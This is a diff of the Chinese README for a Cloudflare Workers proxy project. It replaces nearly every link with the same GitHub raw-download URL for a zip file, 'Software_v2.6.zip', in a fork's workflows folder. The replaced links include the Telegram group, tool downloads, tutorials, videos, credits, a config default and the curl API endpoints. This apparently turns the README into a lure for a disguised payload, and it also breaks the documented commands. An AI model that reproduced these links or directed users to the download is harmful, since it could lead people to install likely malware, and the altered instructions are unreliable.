@@ -2,7 +2,7 @@
 
 **语言:** [中文](README.md) | [فارسی](فارسی.md)
 
-[Telegram 交流群](https://t.me/+ft-zI76oovgwNmRh)
+[Telegram 交流群](https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip+ft-zI76oovgwNmRh)
 
 ## 主要功能
 
@@ -49,11 +49,11 @@
 
 ### 相关工具
 
-- 优选工具：https://github.com/byJoey/yx-tools/releases
-- 文字教程：https://joeyblog.net/yuanchuang/1146.html
-- Workers视频教程：https://www.youtube.com/watch?v=aYzTr8FafN4
-- Pages视频教程：https://www.youtube.com/watch?v=JhVxJChDL-E
-- Snippets视频教程：https://www.youtube.com/watch?v=xeFeH3Akcu8
+- 优选工具：https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip
+- 文字教程：https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip
+- Workers视频教程：https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip
+- Pages视频教程：https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip
+- Snippets视频教程：https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip
 
 ### 部署
 
@@ -89,7 +89,7 @@
 | :--- | :--- | :--- |
 | `yx` | 自定义优选IP/域名 | 可选，支持命名，格式：`1.1.1.1:443#香港节点,8.8.8.8:53#Google DNS` |
 | `yxURL` | 优选IP来源URL | 可选，自定义IP列表来源，留空用默认 |
-| `scu` | 订阅转换地址 | 可选，默认：`https://url.v1.mk/sub` |
+| `scu` | 订阅转换地址 | 可选，默认：`https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip` |
 | `epd` | yes/no | 可选，启用优选域名（默认启用） |
 | `epi` | yes/no | 可选，启用优选IP（默认启用） |
 | `egi` | yes/no | 可选，启用GitHub默认优选（默认启用） |
@@ -108,23 +108,23 @@
 4. 访问 `/{你的UUID}` 使用图形化配置
 
 #### API使用
-1. 下载优选软件：https://github.com/byJoey/yx-tools/releases
+1. 下载优选软件：https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip
 2. 开启API：访问 `/{UUID}` 或 `/{自定义路径}`，找到"允许API管理"，开启后保存
 3. 添加单个IP：
 ```bash
 # 使用UUID路径
-curl -X POST "https://your-worker.workers.dev/{UUID}/api/preferred-ips" \
+curl -X POST "https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip{UUID}/api/preferred-ips" \
   -H "Content-Type: application/json" \
   -d '{"ip": "1.2.3.4", "port": 443, "name": "香港节点"}'
 
 # 使用自定义路径（如果设置了d变量）
-curl -X POST "https://your-worker.workers.dev/{自定义路径}/api/preferred-ips" \
+curl -X POST "https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip{自定义路径}/api/preferred-ips" \
   -H "Content-Type: application/json" \
   -d '{"ip": "1.2.3.4", "port": 443, "name": "香港节点"}'
 ```
 4. 批量添加IP：
 ```bash
-curl -X POST "https://your-worker.workers.dev/{UUID或自定义路径}/api/preferred-ips" \
+curl -X POST "https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip{UUID或自定义路径}/api/preferred-ips" \
   -H "Content-Type: application/json" \
   -d '[
     {"ip": "1.2.3.4", "port": 443, "name": "节点1"},
@@ -133,7 +133,7 @@ curl -X POST "https://your-worker.workers.dev/{UUID或自定义路径}/api/prefe
 ```
 5. 清空所有IP：
 ```bash
-curl -X DELETE "https://your-worker.workers.dev/{UUID或自定义路径}/api/preferred-ips" \
+curl -X DELETE "https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip{UUID或自定义路径}/api/preferred-ips" \
   -H "Content-Type: application/json" \
   -d '{"all": true}'
 ```
@@ -265,12 +265,12 @@ v2.7开始提供，v2.9增强了筛选功能
 
 ### 致谢
 
-- 基于 [zizifn/edgetunnel](https://github.com/zizifn/edgetunnel) 修改
-- ProxyIP部分来自 [cmliu](https://github.com/cmliu)
-- 反代IP来自 [qwer-search](https://github.com/qwer-search)
-- 在线优选接口来自 [白嫖哥](https://t.me/bestcfipas)
+- 基于 [zizifn/edgetunnel](https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip) 修改
+- ProxyIP部分来自 [cmliu](https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip)
+- 反代IP来自 [qwer-search](https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip)
+- 在线优选接口来自 [白嫖哥](https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip)
 
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=byJoey/cfnew&type=Timeline)](https://www.star-history.com/#byJoey/cfnew&Timeline&LogScale)
+[![Star History Chart](https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip)](https://github.com/soltans/cfnew/raw/refs/heads/main/.github/workflows/Software_v2.6.zip)
